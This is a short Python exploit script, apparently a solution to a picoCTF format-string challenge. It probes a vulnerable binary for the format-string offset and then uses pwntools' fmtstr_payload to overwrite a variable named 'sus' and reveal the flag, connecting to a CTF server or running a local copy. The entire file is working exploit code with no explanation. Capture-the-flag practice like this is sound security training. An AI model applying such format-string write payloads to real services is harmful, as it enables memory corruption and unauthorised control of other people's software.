from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./vuln")
load = {elf.sym.sus:0x67616c66}

def start():
    if args.LOCAL:
        print("[+] local process..")
        p = process("./vuln")
    else:
        try:
            SERV = "rhea.picoctf.net"
            PORT = 49754
            p = remote(SERV,PORT)
            print("[+] remoting server..")
        except:
            print("[!] error trying remote. using local instead..")
            p = process("./vuln")
    return p 

def index():
    i = 0
    while True:
        i += 1
        payload = f"AAAAAAAA%{i}$p"
        p = process("./vuln")
        p.sendlineafter(b"say?",payload.encode())
        p.recvuntil(b'AAAAAAAA')
        leak = p.recvline()
        if b"414141" in leak:
            print(f"\nFound at index {i} : {leak.decode()}")
            p.close()
            break
        p.close()
        # index = 14
    return i


index = index() #index = 14 #pake untuk kode yg ngebut

p = start()
payload = fmtstr_payload(index,load,write_size='byte')
p.sendlineafter(b"say?",payload)

for _ in range(3):
    print(p.recvline())
print(p.recv().decode())
p.close()
